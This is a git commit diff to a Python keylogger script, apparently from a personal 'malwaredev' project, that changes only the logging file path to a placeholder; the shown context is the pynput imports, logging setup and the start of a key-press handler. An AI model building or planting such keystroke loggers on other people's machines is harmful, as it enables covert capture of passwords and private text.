75390f70237f7de2582492efa1d8169345bce391
halkano781 <61273012+halkano781@users.noreply.github.com>
2023-08-17 07:23:15 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,7 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import logging
-log_dir = r"C:\Users\User\Desktop\halkano project\malwaredev\keylogger.py"
+log_dir = r"C:\path\to\keylogger.py"
 logging.basicConfig(filename=(log_dir + r"keylogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
